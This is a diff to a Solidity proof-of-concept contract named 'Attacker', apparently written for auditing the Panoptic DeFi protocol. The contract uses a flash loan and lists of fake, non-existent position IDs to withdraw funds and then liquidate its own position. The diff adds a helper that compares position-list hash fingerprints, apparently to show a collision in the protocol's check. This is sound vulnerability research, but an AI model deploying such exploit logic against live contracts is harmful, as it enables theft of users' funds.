@@ -5,6 +5,8 @@ import "./Interfaces.sol";
 import {TokenId} from "@types/TokenId.sol";
 import {console} from "forge-std/Test.sol";
 
+import {PanopticMath} from "@libraries/PanopticMath.sol";
+
 // On mainnet
 address constant WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
 address constant USDC = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
@@ -498,6 +500,7 @@ contract Attacker is IFlashLoanReceiver {
             fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
         }
 
+
         // Now use the list of positions that don't exist
 
         // calculate how much I can withdraw
@@ -517,9 +520,30 @@ contract Attacker is IFlashLoanReceiver {
         console.log("my final token 1 balance: ", token1.balanceOf(address(this)));
         console.log("------------------------");
 
+        console.log('posIdList2 fingerprint', generateFingerprint(posIdList2, 0));
+        console.log('fakeTokenIdList fingerprint', generateFingerprint(fakeTokenIdList, 0));
+
         // now liquidate my own position and repeat...
         TokenId[] memory emptyTokenList = new TokenId[](0);
         pp.liquidate(emptyTokenList, address(this), posIdList2);
+    }
+
+    function generateFingerprint(TokenId[] memory positionIdList, uint256 offset) internal pure returns (uint256) {
+        uint256 pLength = positionIdList.length - offset;
+        uint256 fingerprintIncomingList;
+
+        for (uint256 i = 0; i < pLength; ) {
+            fingerprintIncomingList = PanopticMath.updatePositionsHash(
+                fingerprintIncomingList,
+                positionIdList[i],
+                true
+            );
+            unchecked {
+                ++i;
+            }
+        }
+
+        return fingerprintIncomingList;
     }
 
     function min(uint256 a, uint256 b) internal pure returns (uint256) {
